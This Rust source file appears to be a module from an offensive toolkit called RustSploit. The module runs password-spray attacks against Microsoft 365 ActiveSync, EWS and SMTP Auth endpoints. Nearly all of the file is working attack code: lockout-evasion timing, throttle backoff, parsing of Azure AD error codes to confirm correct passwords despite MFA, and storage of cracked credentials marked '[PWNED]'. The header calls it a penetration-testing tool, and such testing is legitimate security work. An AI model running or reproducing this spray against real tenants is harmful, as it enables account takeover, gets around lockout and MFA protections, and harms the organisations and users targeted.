//! M365 ActiveSync/EWS Password Spray Module (MFA Bypass)
//!
//! Automates password spraying against Microsoft 365 ActiveSync, EWS, and SMTP
//! Auth endpoints. On managed tenants that still have Basic Auth enabled, these
//! legacy protocols bypass MFA entirely.
//!
//! Strategy: spray 1 password across ALL accounts per round, with a configurable
//! delay between rounds. This avoids per-account lockout while testing rapidly.
//!
//! For authorized penetration testing only.

use anyhow::{Context, Result, anyhow};
use base64::{Engine as _, engine::general_purpose};
use colored::*;
use std::time::Duration;

use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::{
    build_http_client, cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range,
    cfg_prompt_output_file, cfg_prompt_yes_no, load_lines,
};

// ============================================================================
// Constants
// ============================================================================

const ACTIVESYNC_URL: &str = "https://outlook.office365.com/Microsoft-Server-ActiveSync";
const EWS_URL: &str = "https://outlook.office365.com/EWS/Exchange.asmx";
const SMTP_HOST: &str = "smtp.office365.com";
const SMTP_PORT: u16 = 587;

const DEFAULT_DELAY_SECS: u64 = 5;
const DEFAULT_CONCURRENCY: usize = 10;
const DEFAULT_TIMEOUT_SECS: u64 = 15;

// ============================================================================
// Module Info
// ============================================================================

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "M365 ActiveSync/EWS Password Spray (MFA Bypass)".to_string(),
        description: "Password spray against M365 ActiveSync, EWS, and SMTP Auth endpoints. \
            Basic Auth on these legacy protocols bypasses MFA on managed tenants. \
            Uses a one-password-per-round strategy to evade account lockout policies."
            .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![
            "https://github.com/dafthack/MSOLSpray".to_string(),
            "https://docs.microsoft.com/en-us/exchange/clients-and-mobile-in-exchange-online/deprecation-of-basic-authentication-exchange-online".to_string(),
            "https://blog.rapid7.com/2020/06/09/o365-credential-stuffing-attacks/".to_string(),
        ],
        disclosure_date: None,
        rank: ModuleRank::Excellent,
        default_port: Some(443),
    }
}

// ============================================================================
// Spray Mode
// ============================================================================

#[derive(Debug, Clone, Copy, PartialEq)]
enum SprayMode {
    ActiveSync,
    Ews,
    Smtp,
    All,
}

impl SprayMode {
    fn parse(s: &str) -> Self {
        match s.to_lowercase().trim() {
            "activesync" | "as" => Self::ActiveSync,
            "ews" => Self::Ews,
            "smtp" => Self::Smtp,
            "all" => Self::All,
            _ => Self::All,
        }
    }
}

// ============================================================================
// Spray Result
// ============================================================================

#[derive(Clone)]
struct SprayHit {
    username: String,
    password: String,
    endpoint: String,
    status: u16,
    detail: String,
}

impl std::fmt::Debug for SprayHit {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SprayHit")
            .field("username", &self.username)
            .field("password", &"***")
            .field("endpoint", &self.endpoint)
            .field("status", &self.status)
            .field("detail", &self.detail)
            .finish()
    }
}

// ============================================================================
// HTTP Spray Logic
// ============================================================================

/// Attempt Basic Auth against the given URL. Returns
/// (status_code, x-ms-diagnostics header, authenticated-response signature).
/// The signature is positive evidence that a 200 response actually came from
/// an *authenticated* protocol exchange (ActiveSync protocol headers / SOAP
/// envelope), not from some unauthenticated informational page.
async fn try_http_basic(
    client: &reqwest::Client,
    url: &str,
    username: &str,
    password: &str,
) -> Result<(u16, Option<String>, bool)> {
    let creds = format!("{}:{}", username, password);
    let encoded = general_purpose::STANDARD.encode(creds.as_bytes());

    let resp = client
        .get(url)
        .header("Authorization", format!("Basic {}", encoded))
        .header("User-Agent", "Microsoft-Server-ActiveSync")
        .send()
        .await
        .context("HTTP request failed")?;

    let status = resp.status().as_u16();
    let diag = match resp.headers().get("X-MS-Diagnostics") {
        Some(v) => match v.to_str() {
            Ok(s) => Some(s.to_string()),
            Err(e) => {
                tracing::trace!("non-utf8 X-MS-Diagnostics header: {e}");
                None
            }
        },
        None => None,
    };

    // Positive authenticated-response signature (required for a 200 verdict).
    let mut authed_signature = false;
    if status == 200 {
        let hdrs = resp.headers();
        let is_as = url.contains("Microsoft-Server-ActiveSync");
        let has_as_protocol = hdrs.contains_key("MS-ASProtocolCommands")
            || hdrs.contains_key("MS-ASProtocolVersions");
        let ctype = crate::utils::network::header_string(hdrs, "content-type").to_lowercase();
        if (is_as && has_as_protocol)
            || (!is_as && (ctype.contains("xml") || ctype.contains("soap")))
        {
            authed_signature = true;
        } else {
            // Fall back to a capped body sniff for protocol-shaped content.
            match crate::utils::network::read_http_body_text_capped(resp, 256 * 1024).await {
                Ok(body) => {
                    let trimmed = body.trim_start();
                    authed_signature = trimmed.starts_with('<')
                        || body.contains("Envelope")
                        || body.contains("ActiveSync");
                }
                Err(e) => {
                    tracing::debug!("auth-signature body sniff failed: {e}");
                    // Signature not observable — the 200 stays unconfirmed.
                    authed_signature = false;
                }
            }
        }
    }

    Ok((status, diag, authed_signature))
}

/// Render the optional X-MS-Diagnostics header for display.
fn diag_str(diag: &Option<String>) -> String {
    match diag {
        Some(d) => d.clone(),
        None => "<none>".to_string(),
    }
}

/// Classify an HTTP response for M365 endpoints.
fn classify_http_response(status: u16, diag: &Option<String>) -> &'static str {
    match status {
        200 => "VALID CREDENTIALS - MFA BYPASSED",
        401 => "Invalid password",
        403 => "Account locked/blocked",
        456 => "Blocked by Conditional Access Policy",
        _ => {
            if let Some(d) = diag {
                if d.contains("LockoutThreshold") {
                    return "Account lockout threshold reached";
                }
                if d.contains("UserNotFound") {
                    return "User not found";
                }
            }
            "Unknown response"
        }
    }
}

/// Decide whether a response proves the PASSWORD is correct — even when another
/// control blocks the sign-in (MFA, expired, disabled). Azure AD returns 401 with
/// an ESTS error code in `X-MS-Diagnostics`; several of those codes mean the
/// password was right (MSOLSpray semantics). A bare HTTP 200 is NOT accepted on
/// its own: it must also carry the authenticated-response signature and carry no
/// negative diagnostics, so an unauthenticated/informational 200 cannot be
/// reported as an MFA-bypass credential. Returns Some(reason) if valid.
fn credential_is_valid(
    status: u16,
    diag: &Option<String>,
    authed_signature: bool,
) -> Option<&'static str> {
    if status == 200 {
        if !authed_signature {
            return None;
        }
        if let Some(d) = diag {
            let negative =
                d.contains("UserNotFound") || d.contains("LockoutThreshold") || d.contains("50126");
            if negative {
                return None;
            }
        }
        return Some("valid credentials (full access)");
    }
    let d = diag.as_deref()?;
    if d.contains("50126") {
        // AADSTS50126: invalid username or password — the one true negative.
        None
    } else if d.contains("50055") {
        Some("valid credentials — password expired")
    } else if d.contains("50057") {
        Some("valid credentials — account disabled")
    } else if d.contains("50079")
        || d.contains("50076")
        || d.contains("50074")
        || d.contains("53004")
    {
        Some("valid credentials — MFA required")
    } else if d.contains("50158") {
        Some("valid credentials — external security challenge (conditional access)")
    } else {
        None
    }
}

/// True when Azure AD is throttling us (HTTP 429/503 or an ESTS throttle code),
/// so the spray can back off instead of hammering through false negatives.
fn is_throttled(status: u16, diag: &Option<String>) -> bool {
    if status == 429 || status == 503 {
        return true;
    }
    match diag.as_deref() {
        Some(d) => d.contains("90033") || d.to_lowercase().contains("throttle"),
        None => false,
    }
}

// ============================================================================
// SMTP Spray Logic
// ============================================================================

/// Attempt SMTP AUTH LOGIN via STARTTLS on smtp.office365.com:587.
fn try_smtp_auth(username: &str, password: &str, timeout_secs: u64) -> Result<bool> {
    use std::io::{BufRead, BufReader, Write};
    use std::net::TcpStream;

    let addr = format!("{}:{}", SMTP_HOST, SMTP_PORT);
    let timeout = Duration::from_secs(timeout_secs);

    let socket_addr = addr.parse::<std::net::SocketAddr>().or_else(|e| {
        tracing::debug!("SMTP addr parse failed ({e:#}), falling back to DNS");
        use std::net::ToSocketAddrs;
        addr.to_socket_addrs()?
            .next()
            .ok_or_else(|| anyhow!("DNS resolution failed for {}", SMTP_HOST))
    })?;

    let stream = crate::utils::blocking_tcp_connect(&socket_addr, timeout)?;
    stream.set_read_timeout(Some(timeout))?;
    stream.set_write_timeout(Some(timeout))?;

    let mut reader = BufReader::new(&stream);
    let mut writer: &TcpStream = &stream;

    // Read banner
    let mut line = String::new();
    reader.read_line(&mut line)?;
    if !line.starts_with("220") {
        return Err(anyhow!("No 220 banner from SMTP server"));
    }

    // EHLO
    writer.write_all(b"EHLO spray\r\n")?;
    writer.flush()?;

    // Read EHLO response
    loop {
        let mut resp = String::new();
        reader.read_line(&mut resp)?;
        if resp.starts_with("250 ") {
            break;
        }
        if !resp.starts_with("250") {
            return Err(anyhow!("Unexpected EHLO response: {}", resp.trim()));
        }
    }

    // STARTTLS
    writer.write_all(b"STARTTLS\r\n")?;
    writer.flush()?;

    let mut starttls_resp = String::new();
    reader.read_line(&mut starttls_resp)?;
    if !starttls_resp.starts_with("220") {
        return Err(anyhow!("STARTTLS not supported"));
    }

    // Upgrade to TLS using native-tls
    let connector = native_tls::TlsConnector::builder()
        .danger_accept_invalid_certs(false)
        .build()
        .context("TLS connector build failed")?;

    let mut tls_stream = connector
        .connect(SMTP_HOST, stream)
        .context("TLS handshake failed")?;

    // `BufReader` over a mutable borrow of the TLS stream gives us `read_line`
    // while still allowing writes via `get_mut()` (since `&mut TlsStream`
    // implements both `Read` and `Write`).
    let mut tls_reader = BufReader::new(&mut tls_stream);

    // EHLO again over TLS
    std::io::Write::write_all(tls_reader.get_mut(), b"EHLO spray\r\n")?;
    std::io::Write::flush(tls_reader.get_mut())?;

    loop {
        let mut resp = String::new();
        tls_reader.read_line(&mut resp)?;
        if resp.starts_with("250 ") {
            break;
        }
        if !resp.starts_with("250") {
            return Err(anyhow!("Unexpected post-TLS EHLO response"));
        }
    }

    // AUTH LOGIN
    std::io::Write::write_all(tls_reader.get_mut(), b"AUTH LOGIN\r\n")?;
    std::io::Write::flush(tls_reader.get_mut())?;

    let mut prompt = String::new();
    tls_reader.read_line(&mut prompt)?;
    if !prompt.starts_with("334") {
        return Ok(false);
    }

    // Send username (base64)
    let user_b64 = general_purpose::STANDARD.encode(username.as_bytes());
    std::io::Write::write_all(tls_reader.get_mut(), format!("{}\r\n", user_b64).as_bytes())?;
    std::io::Write::flush(tls_reader.get_mut())?;

    let mut prompt2 = String::new();
    tls_reader.read_line(&mut prompt2)?;
    if !prompt2.starts_with("334") {
        return Ok(false);
    }

    // Send password (base64)
    let pass_b64 = general_purpose::STANDARD.encode(password.as_bytes());
    std::io::Write::write_all(tls_reader.get_mut(), format!("{}\r\n", pass_b64).as_bytes())?;
    std::io::Write::flush(tls_reader.get_mut())?;

    let mut auth_resp = String::new();
    tls_reader.read_line(&mut auth_resp)?;

    // 235 = success
    if auth_resp.starts_with("235") {
        if let Err(e) = std::io::Write::write_all(tls_reader.get_mut(), b"QUIT\r\n") {
            tracing::debug!("ActiveSync QUIT write failed: {e:#}");
        }
        if let Err(e) = std::io::Write::flush(tls_reader.get_mut()) {
            tracing::debug!("ActiveSync flush failed: {e:#}");
        }
        return Ok(true);
    }

    Ok(false)
}

// ============================================================================
// Display
// ============================================================================

fn display_banner() {
    if crate::utils::is_batch_mode() {
        return;
    }
    crate::mprintln!(
        "{}",
        "╔══════════════════════════════════════════════════════════════════════╗".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   M365 ActiveSync/EWS Password Spray (MFA Bypass)                  ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║                                                                      ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Basic Auth on legacy protocols bypasses MFA on managed tenants    ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Strategy: 1 password per round across all accounts               ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "║   Targets: ActiveSync, EWS, SMTP Auth                              ║".cyan()
    );
    crate::mprintln!(
        "{}",
        "╚══════════════════════════════════════════════════════════════════════╝".cyan()
    );
    crate::mprintln!();
}

// ============================================================================
// Main Run
// ============================================================================

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("m365_activesync_spray requires a single-host target")?;

    // This module sprays the fixed Exchange Online endpoints
    // (outlook.office365.com / smtp.office365.com) regardless of which host
    // it is pointed at. Under the universal per-host scheduler fan-out, a
    // CIDR/file/multi target is expanded into one `run()` call per host — so
    // without this gate the ENTIRE user×password spray against Microsoft 365
    // would be repeated once for every host in the input, wasting attempts,
    // multiplying lockout risk on real M365 accounts, and producing duplicate
    // findings. Only proceed when the resolved single target is actually an
    // Exchange Online host; for any other host (e.g. an unrelated address
    // pulled in by fan-out) skip cleanly so the spray runs exactly once.
    // Extract the bare hostname from the resolved single target, tolerating
    // optional `user@`, `[ipv6]`, and `:port` decorations.
    let mut host = target;
    if let Some((_, rest)) = host.rsplit_once('@') {
        host = rest;
    }
    if let Some(rest) = host.strip_prefix('[') {
        // `[ipv6]` or `[ipv6]:port` — take the bracketed portion.
        host = match rest.split(']').next() {
            Some(inner) => inner,
            None => rest,
        };
    } else if let Some((h, _)) = host.rsplit_once(':') {
        // `host:port` — strip the trailing port.
        host = h;
    }
    let host = host.trim_end_matches('.').to_ascii_lowercase();
    let is_m365_endpoint = host == "outlook.office365.com"
        || host == "smtp.office365.com"
        || host.ends_with(".office365.com")
        || host.ends_with(".outlook.com")
        || host.ends_with(".onmicrosoft.com");
    if !is_m365_endpoint {
        let mut outcome = ModuleOutcome::ok();
        outcome.findings.push(Finding {
            target: target.to_string(),
            kind: FindingKind::Note,
            message: format!(
                "Skipped M365 spray: target '{}' is not an Exchange Online endpoint. \
                 Point this module at outlook.office365.com / smtp.office365.com (or a \
                 tenant host) to run the spray exactly once.",
                target
            ),
            data: None,
        });
        if !crate::utils::is_batch_mode() {
            crate::mprintln!(
                "{}",
                format!(
                    "[*] Skipping {} — not an M365/Exchange Online endpoint (no per-host re-spray).",
                    target
                )
                .dimmed()
            );
        }
        return Ok(outcome);
    }

    display_banner();

    // --- Configuration prompts ---
    let users_file =
        cfg_prompt_existing_file("user_list", "User list file (email addresses)").await?;
    let pass_file = cfg_prompt_existing_file("password_list", "Password list file").await?;

    let delay_secs: u64 = cfg_prompt_int_range(
        "delay_secs",
        "Delay between rounds (seconds, lockout evasion)",
        DEFAULT_DELAY_SECS as i64,
        0,
        300,
    )
    .await? as u64;

    let concurrency: usize = cfg_prompt_int_range(
        "concurrency",
        "Max concurrent connections per round",
        DEFAULT_CONCURRENCY as i64,
        1,
        100,
    )
    .await? as usize;

    let mode_str =
        cfg_prompt_default("spray_mode", "Spray mode (activesync/ews/smtp/all)", "all").await?;
    let mode = SprayMode::parse(&mode_str);

    let output_file = cfg_prompt_output_file(
        "output_file",
        "Output file for valid credentials",
        "m365_spray_results.txt",
    )
    .await?;

    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;

    let timeout_secs: u64 = cfg_prompt_int_range(
        "timeout",
        "Connection timeout (seconds)",
        DEFAULT_TIMEOUT_SECS as i64,
        1,
        120,
    )
    .await? as u64;

    // --- Load wordlists ---
    let users = load_lines(&users_file)?;
    let passwords = load_lines(&pass_file)?;

    if users.is_empty() {
        return Err(anyhow!("User list is empty"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("Password list is empty"));
    }

    crate::mprintln!(
        "[*] Loaded {} users and {} passwords",
        users.len().to_string().bold(),
        passwords.len().to_string().bold()
    );
    crate::mprintln!(
        "[*] Mode: {:?} | Concurrency: {} | Delay between rounds: {}s",
        mode,
        concurrency,
        delay_secs
    );
    crate::mprintln!();

    // --- Build HTTP client ---
    let client = build_http_client(Duration::from_secs(timeout_secs))
        .context("Failed to build HTTP client")?;

    // --- Spray execution ---
    // Strategy: iterate passwords (outer), spray each password across all users (inner).
    // Transport-level failures (ActiveSync/EWS/SMTP errors) are tracked: every
    // affected (user, password) attempt is re-queued for the next round and the
    // totals are surfaced in the summary regardless of verbose mode, so a single
    // network blip can never silently skip an account.
    let mut hits: Vec<SprayHit> = Vec::new();
    let total_rounds = passwords.len();
    let mut pending_retries: Vec<(String, String)> = Vec::new();
    let mut total_transport_errors: usize = 0;

    for (round_idx, password) in passwords.iter().enumerate() {
        if ctx.is_cancelled() {
            crate::mprintln!("{}", "[!] Cancelled by operator".yellow());
            break;
        }

        crate::mprintln!(
            "{}",
            format!(
                "[*] Round {}/{} - Spraying password: {}",
                round_idx + 1,
                total_rounds,
                password
            )
            .cyan()
        );

        // Re-queue attempts that failed at the transport level in a previous
        // round (their recorded password) ahead of the normal per-user jobs.
        let mut round_jobs: Vec<(String, String)> = std::mem::take(&mut pending_retries);
        for user in &users {
            round_jobs.push((user.clone(), password.clone()));
        }

        // Spray this round's (user, password) jobs with concurrency control
        let semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(concurrency));
        // Set by any worker that sees Azure AD throttling, so we back off before
        // the next password round instead of hammering through false negatives.
        let throttled = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
        let mut handles = Vec::new();

        for (user, job_password) in &round_jobs {
            if ctx.is_cancelled() {
                break;
            }

            let sem = semaphore.clone();
            let throttled = throttled.clone();
            let client = client.clone();
            let user = user.clone();
            let password = job_password.clone();
            let mode = mode;
            let verbose = verbose;
            let timeout_secs = timeout_secs;

            let handle = tokio::spawn(async move {
                // SemaphorePermit is a Drop guard held for the whole attempt.
                let permit = match sem.acquire().await {
                    Ok(p) => p,
                    Err(e) => {
                        crate::meprintln!("[!] Semaphore acquire failed (closed?): {}", e);
                        return (Vec::new(), Vec::new());
                    }
                };
                let mut round_hits: Vec<SprayHit> = Vec::new();
                // (user, protocol, error) triples for transport-level failures.
                let mut round_errors: Vec<(String, String, String)> = Vec::new();

                // --- ActiveSync ---
                if mode == SprayMode::ActiveSync || mode == SprayMode::All {
                    match try_http_basic(&client, ACTIVESYNC_URL, &user, &password).await {
                        Ok((status, diag, authed_sig)) => {
                            if is_throttled(status, &diag) {
                                throttled.store(true, std::sync::atomic::Ordering::Relaxed);
                            }
                            match credential_is_valid(status, &diag, authed_sig) {
                                Some(reason) => {
                                    round_hits.push(SprayHit {
                                        username: user.clone(),
                                        password: password.clone(),
                                        endpoint: "ActiveSync".to_string(),
                                        status,
                                        detail: reason.to_string(),
                                    });
                                }
                                None if verbose => {
                                    crate::mprintln!(
                                        "  [{}] {} @ ActiveSync: {} ({})",
                                        status,
                                        user,
                                        classify_http_response(status, &diag),
                                        diag_str(&diag)
                                    );
                                }
                                None => {}
                            }
                            // Warn on lockout/block
                            if status == 403 || status == 456 {
                                crate::mprintln!(
                                    "  {}",
                                    format!(
                                        "[!] {} - {} ({})",
                                        user,
                                        classify_http_response(status, &diag),
                                        diag_str(&diag)
                                    )
                                    .yellow()
                                );
                            }
                        }
                        Err(e) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ ActiveSync error: {}", user, e);
                            }
                            round_errors.push((
                                user.clone(),
                                password.clone(),
                                format!("ActiveSync: {e}"),
                            ));
                        }
                    }
                }

                // --- EWS ---
                if mode == SprayMode::Ews || mode == SprayMode::All {
                    match try_http_basic(&client, EWS_URL, &user, &password).await {
                        Ok((status, diag, authed_sig)) => {
                            if is_throttled(status, &diag) {
                                throttled.store(true, std::sync::atomic::Ordering::Relaxed);
                            }
                            match credential_is_valid(status, &diag, authed_sig) {
                                Some(reason) => {
                                    round_hits.push(SprayHit {
                                        username: user.clone(),
                                        password: password.clone(),
                                        endpoint: "EWS".to_string(),
                                        status,
                                        detail: reason.to_string(),
                                    });
                                }
                                None if verbose => {
                                    crate::mprintln!(
                                        "  [{}] {} @ EWS: {} ({})",
                                        status,
                                        user,
                                        classify_http_response(status, &diag),
                                        diag_str(&diag)
                                    );
                                }
                                None => {}
                            }
                            if status == 403 || status == 456 {
                                crate::mprintln!(
                                    "  {}",
                                    format!(
                                        "[!] {} - {} ({})",
                                        user,
                                        classify_http_response(status, &diag),
                                        diag_str(&diag)
                                    )
                                    .yellow()
                                );
                            }
                        }
                        Err(e) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ EWS error: {}", user, e);
                            }
                            round_errors.push((
                                user.clone(),
                                password.clone(),
                                format!("EWS: {e}"),
                            ));
                        }
                    }
                }

                // --- SMTP ---
                if mode == SprayMode::Smtp || mode == SprayMode::All {
                    let user_clone = user.clone();
                    let pass_clone = password.clone();
                    let smtp_result = tokio::task::spawn_blocking(move || {
                        try_smtp_auth(&user_clone, &pass_clone, timeout_secs)
                    })
                    .await;

                    match smtp_result {
                        Ok(Ok(true)) => {
                            round_hits.push(SprayHit {
                                username: user.clone(),
                                password: password.clone(),
                                endpoint: "SMTP".to_string(),
                                status: 235,
                                detail:
                                    "VALID CREDENTIALS - SMTP Auth (no lockout on this protocol)"
                                        .to_string(),
                            });
                        }
                        Ok(Ok(false)) => {
                            if verbose {
                                crate::mprintln!("  [AUTH_FAIL] {} @ SMTP", user);
                            }
                        }
                        Ok(Err(e)) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ SMTP error: {}", user, e);
                            }
                            round_errors.push((
                                user.clone(),
                                password.clone(),
                                format!("SMTP: {e}"),
                            ));
                        }
                        Err(e) => {
                            if verbose {
                                crate::mprintln!("  [-] {} @ SMTP task error: {}", user, e);
                            }
                            round_errors.push((
                                user.clone(),
                                password.clone(),
                                format!("SMTP task: {e}"),
                            ));
                        }
                    }
                }

                drop(permit);
                (round_hits, round_errors)
            });

            handles.push(handle);
        }

        // Collect results from this round
        let mut round_error_count = 0usize;
        for handle in handles {
            match handle.await {
                Ok((round_hits, round_errors)) => {
                    for hit in round_hits {
                        crate::mprintln!(
                            "\r{}",
                            format!(
                                "[PWNED] {}:{} via {} - {}",
                                hit.username, hit.password, hit.endpoint, hit.detail
                            )
                            .red()
                            .bold()
                        );

                        // Store credential
                        let stored =
                            crate::cred_store::store_credential(crate::cred_store::NewCred {
                                host: "outlook.office365.com",
                                port: if hit.endpoint == "SMTP" {
                                    SMTP_PORT
                                } else {
                                    443
                                },
                                service: &hit.endpoint.to_lowercase(),
                                username: &hit.username,
                                secret: &hit.password,
                                cred_type: crate::cred_store::CredType::Password,
                                source_module: "creds/generic/m365_activesync_spray",
                            })
                            .await;
                        if stored.is_none() {
                            crate::meprintln!(
                                "[!] Failed to store credential for {} ({})",
                                hit.username,
                                hit.endpoint
                            );
                        }

                        hits.push(hit);
                    }
                    for (err_user, err_password, err_msg) in round_errors {
                        // Re-queue the failed attempt for the next round so a
                        // transient blip can never permanently skip an account.
                        pending_retries.push((err_user, err_password));
                        tracing::debug!("spray transport error: {}", err_msg);
                        round_error_count += 1;
                    }
                }
                Err(e) => {
                    crate::meprintln!("[!] Spray worker task failed: {}", e);
                }
            }
        }

        if round_error_count > 0 {
            total_transport_errors += round_error_count;
            crate::mprintln!(
                "{}",
                format!(
                    "[!] {} transport error(s) this round — affected attempt(s) re-queued for the next round (set verbose=true for details)",
                    round_error_count
                )
                .yellow()
            );
        }

        // Back off if Azure AD throttled us this round (429/503/ESTS throttle).
        if throttled.load(std::sync::atomic::Ordering::Relaxed) && round_idx + 1 < total_rounds {
            crate::mprintln!(
                "{}",
                "[!] Throttling detected — backing off 60s before the next password round".yellow()
            );
            tokio::time::sleep(Duration::from_secs(60)).await;
        }

        // Delay between rounds (lockout evasion)
        if round_idx + 1 < total_rounds && delay_secs > 0 {
            crate::mprintln!(
                "{}",
                format!(
                    "[*] Waiting {}s before next round (lockout evasion)...",
                    delay_secs
                )
                .dimmed()
            );
            tokio::time::sleep(Duration::from_secs(delay_secs)).await;
        }
    }

    // --- Results Summary ---
    crate::mprintln!();
    crate::mprintln!("{}", "=== Spray Complete ===".cyan().bold());
    crate::mprintln!(
        "[*] Valid credentials found: {}",
        hits.len().to_string().green().bold()
    );

    if !hits.is_empty() {
        crate::mprintln!();
        crate::mprintln!(
            "{}",
            "[!] NOTE: These credentials bypass MFA via legacy Basic Auth!"
                .red()
                .bold()
        );
        crate::mprintln!(
            "{}",
            "[!] The tenant has Basic Auth enabled on legacy protocols (ActiveSync/EWS/SMTP)."
                .red()
        );
        crate::mprintln!();

        for hit in &hits {
            crate::mprintln!(
                "  {} | {}:{} | {} | {}",
                hit.endpoint.bold(),
                hit.username,
                hit.password,
                hit.status,
                hit.detail
            );
        }

        // Save to file
        save_results(&hits, &output_file)?;
    }

    // --- Build outcome ---
    let mut outcome = ModuleOutcome::ok();
    for hit in &hits {
        outcome.findings.push(Finding {
            target: "outlook.office365.com".to_string(),
            kind: FindingKind::Credential,
            message: format!(
                "M365 credential valid (MFA BYPASSED via legacy auth): {}:{} [{}]",
                hit.username, hit.password, hit.endpoint
            ),
            data: Some(serde_json::json!({
                "username": hit.username,
                "password": hit.password,
                "endpoint": hit.endpoint,
                "status_code": hit.status,
                "detail": hit.detail,
                "mfa_bypassed": true,
                "service": "m365_legacy_auth",
                "port": if hit.endpoint == "SMTP" { SMTP_PORT } else { 443 },
            })),
        });
    }

    // Surface transport-level attempt failures in the outcome so accounts that
    // could not be tested (network blips) are visible without verbose mode.
    if total_transport_errors > 0 {
        let untested = pending_retries.len();
        crate::mprintln!(
            "[!] {} transport error(s) during the spray; {} attempt(s) remained untested at the end (retry the module to cover them)",
            total_transport_errors,
            untested
        );
        outcome.findings.push(Finding {
            target: "outlook.office365.com".to_string(),
            kind: FindingKind::Note,
            message: format!(
                "M365 spray had {} transport-level attempt failure(s); {} attempt(s) were never completed — re-run the module to cover them",
                total_transport_errors, untested
            ),
            data: Some(serde_json::json!({
                "transport_errors": total_transport_errors,
                "untested_attempts": pending_retries.iter().map(|(u, _p)| u.clone()).collect::<Vec<_>>(),
            })),
        });
    }

    Ok(outcome)
}

// ============================================================================
// Save Results
// ============================================================================

fn save_results(hits: &[SprayHit], path: &str) -> Result<()> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;

    let mut opts = std::fs::OpenOptions::new();
    opts.write(true).create(true).truncate(true);
    opts.mode(0o600);
    let mut file = opts.open(path).context("Failed to open output file")?;

    writeln!(file, "# M365 ActiveSync/EWS Password Spray Results")?;
    writeln!(file, "# Generated by RustSploit")?;
    writeln!(
        file,
        "# WARNING: These credentials bypass MFA via legacy Basic Auth"
    )?;
    writeln!(file, "# Total: {} valid credentials found", hits.len())?;
    writeln!(file)?;
    writeln!(
        file,
        "# Format: endpoint | username:password | status | detail"
    )?;

    for hit in hits {
        writeln!(
            file,
            "{} | {}:{} | {} | {}",
            hit.endpoint, hit.username, hit.password, hit.status, hit.detail
        )?;
    }

    crate::mprintln!("{}", format!("[+] Results saved to: {}", path).green());
    Ok(())
}

// ============================================================================
// Registration
// ============================================================================

crate::register_native_module!(
    crate::module::Category::Creds,
    "creds/generic/m365_activesync_spray",
    native
);
